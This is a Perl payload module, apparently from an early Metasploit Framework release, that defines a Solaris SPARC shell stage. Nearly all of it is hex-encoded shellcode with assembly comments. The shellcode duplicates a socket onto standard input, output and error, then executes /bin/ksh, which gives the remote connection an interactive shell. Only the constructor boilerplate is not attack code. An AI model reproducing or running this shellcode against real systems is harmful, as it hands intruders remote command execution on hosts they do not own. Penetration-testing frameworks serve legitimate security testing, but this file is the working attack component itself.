package Msf::PayloadComponent::SolarisShellStage;
use strict;
use base 'Msf::PayloadComponent::SolarisStagePayload';

my $info =
{
    'Authors'      => [ 'optyx <optyx [at] uberhax0r.net>', ],
    'Priv'         => 0,

    'SolarisStagePayload' =>
    {
        Payload =>
			
			# XXX - things are not working w/o this nop...
			"\xaa\x1d\x40\x15".
			        
            "\x9a\x02\x60\x3c".     # add          %o1, 60, %o5
            "\x94\x10\x20\x02".     # mov          2, %o2       
		    "\x90\x10\x00\x04".     # mov          %g4, %o0   
            "\x92\x10\x20\x09".     # mov          9, %o1
            "\x82\x10\x20\x3e".     # mov          62, %g1
            "\x91\xd0\x20\x08".     # ta           0x8
            "\x94\x82\xbf\xff".     # addcc        %o2, -1, %o2
            "\x3c\xbf\xff\xfb".     # bpos,a       0x10368			
			"\xaa\x1d\x40\x15".		# xor          %l5, %l5, %l5 (nop)
			
			# execve is LSD's, optyx's original execve wasn't happy..
			"\x20\xbf\xff\xff".     # bn,a         <shellcode-4>        
			"\x20\xbf\xff\xff".     # bn,a         <shellcode>          
			"\x7f\xff\xff\xff".     # call         <shellcode+4>        
			"\x90\x03\xe0\x20".     # add          %o7,32,%o0           
			"\x92\x02\x20\x10".     # add          %o0,16,%o1           
			"\xc0\x22\x20\x08".     # st           %g0,[%o0+8]          
			"\xd0\x22\x20\x10".     # st           %o0,[%o0+16]         
			"\xc0\x22\x20\x14".     # st           %g0,[%o0+20]         
			"\x82\x10\x20\x0b".     # mov          0xb,%g1              
			"\x91\xd0\x20\x08".     # ta           8                    
			"/bin/ksh",
    }
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}
